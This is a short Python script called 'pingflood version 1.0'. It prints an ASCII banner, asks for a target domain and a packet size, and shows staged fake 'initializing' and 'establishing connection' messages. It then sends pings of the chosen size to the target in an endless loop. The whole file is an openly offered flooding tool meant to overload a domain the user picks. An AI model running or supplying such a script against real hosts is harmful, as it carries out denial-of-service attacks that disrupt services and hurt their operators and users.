from pythonping import ping
import time
print(""" 
 _____ (_)            
 | |__) | _ __   __ _
 |  ___/ | '_ \ / _` |
 | |   | | | | | (_| |
 |_|   |_|_| |_|\__, |
                 __/ |                            
                |___/   """)
print("Welcome to pingflood version 1.0")
id = input("What is the domain that you wish to flood?    ")
count = int(input("Packet size:   "))
print("initializing...")
time.sleep(1)
print("INIT SCRIPT RUNNING")
time.sleep(1)
print("INIT SCRIPT RUNNING")
print("INIT SCRIPT RUNNING")
print("Establishing connection...")
print("Establishing connection...")
time.sleep(3)
print("Establishing connection...")
time.sleep(10)

print("Pinging target...")
time.sleep(2)
print("Pinging target...")
time.sleep(1)
while True:
    ping(id, verbose=True, size=count)


